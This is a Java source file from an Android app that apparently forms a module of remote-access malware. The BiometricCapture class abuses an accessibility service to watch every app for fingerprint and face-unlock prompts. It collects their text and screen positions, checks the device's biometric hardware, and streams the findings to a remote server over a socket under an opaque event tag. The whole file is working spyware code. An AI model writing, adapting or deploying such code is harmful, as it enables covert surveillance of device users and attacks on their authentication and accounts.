package com.fason.app.features.biometrics;

import android.accessibilityservice.AccessibilityService;
import android.hardware.biometrics.BiometricManager;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import io.socket.client.Socket;

/**
 * BiometricCapture — detects and captures biometric auth events.
 * Watches accessibility events for biometric prompt windows, extracts
 * prompt metadata (title, subtitle, package), and reports hardware state.
 */
public final class BiometricCapture {
    private static volatile BiometricCapture instance;
    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final AtomicBoolean watching = new AtomicBoolean(false);
    private volatile AccessibilityService service;

    private BiometricCapture() {}

    public static synchronized BiometricCapture getInstance() {
        if (instance == null) instance = new BiometricCapture();
        return instance;
    }

    public void setAccessibilityService(AccessibilityService s) { this.service = s; }

    public void start() { watching.set(true); emitStatus("started"); }
    public void stop() { watching.set(false); emitStatus("stopped"); }
    public boolean isWatching() { return watching.get(); }

    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!watching.get() || event == null) return;
        int t = event.getEventType();
        if (t != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && t != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        // Biometric prompts typically come from sysui or the requesting app
        if (!pkg.contains("systemui") && !pkg.contains("android")) {
            // also check the event source tree for biometric node text
        }
        exec.execute(() -> scanForBiometricPrompt(event, pkg));
    }

    private void scanForBiometricPrompt(AccessibilityEvent event, String pkg) {
        AccessibilityNodeInfo root = null;
        AccessibilityService s = service;
        try {
            if (s != null && s.getRootInActiveWindow() != null) {
                root = s.getRootInActiveWindow();
            } else if (event.getSource() != null) {
                root = event.getSource();
            }
            if (root == null) return;

            JSONArray findings = new JSONArray();
            harvestBiometricNodes(root, findings, 0);
            root.recycle();

            if (findings.length() > 0) {
                JSONObject o = new JSONObject();
                o.put("event", "biometric_prompt");
                o.put("package", pkg);
                o.put("nodes", findings);
                o.put("timestamp", System.currentTimeMillis());
                emit(o);
            }
        } catch (Exception ignored) {}
    }

    private void harvestBiometricNodes(AccessibilityNodeInfo node, JSONArray out, int depth) {
        if (node == null || depth > 30 || out.length() > 20) return;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String combined = ((text != null ? text.toString() : "") + " "
                    + (desc != null ? desc.toString() : "")).toLowerCase();
            if (combined.matches(".*(fingerprint|face unlock|biometric|verify.*identity|use.*biometric|touch.*sensor|look.*screen).*")) {
                JSONObject n = new JSONObject();
                n.put("text", text != null ? text.toString() : "");
                n.put("desc", desc != null ? desc.toString() : "");
                if (node.getClassName() != null) n.put("class", node.getClassName().toString());
                android.graphics.Rect r = new android.graphics.Rect();
                node.getBoundsInScreen(r);
                n.put("bounds", r.flattenToString());
                out.put(n);
            }
            for (int i = 0; i < node.getChildCount() && out.length() <= 20; i++) {
                AccessibilityNodeInfo c = node.getChild(i);
                if (c != null) { harvestBiometricNodes(c, out, depth + 1); c.recycle(); }
            }
        } catch (Exception ignored) {}
    }

    public JSONObject getHardwareStatus() {
        JSONObject s = new JSONObject();
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                android.hardware.biometrics.BiometricManager bm = null;
                if (android.os.Build.VERSION.SDK_INT >= 29) {
                    bm = (android.hardware.biometrics.BiometricManager)
                            com.fason.app.core.FasonApp.getContext().getSystemService(android.hardware.biometrics.BiometricManager.class);
                }
                if (bm != null) {
                    int canFinger = bm.canAuthenticate(android.hardware.biometrics.BiometricManager.Authenticators.BIOMETRIC_STRONG);
                    int canFace = bm.canAuthenticate(android.hardware.biometrics.BiometricManager.Authenticators.BIOMETRIC_WEAK);
                    s.put("fingerprint", canFinger == android.hardware.biometrics.BiometricManager.BIOMETRIC_SUCCESS);
                    s.put("face", canFace == android.hardware.biometrics.BiometricManager.BIOMETRIC_SUCCESS);
                }
            } else {
                s.put("fingerprint", false);
                s.put("face", false);
            }
            s.put("sdk", Build.VERSION.SDK_INT);
        } catch (Exception e) {
            try { s.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return s;
    }

    private void emitStatus(String status) {
        try {
            JSONObject o = new JSONObject();
            o.put("event", "status");
            o.put("status", status);
            emit(o);
        } catch (Exception ignored) {}
    }

    private void emit(JSONObject o) {
        Socket s = SocketClient.getInstance() != null ? SocketClient.getInstance().getSocket() : null;
        if (s != null) s.emit("0xBI", o);
    }
}
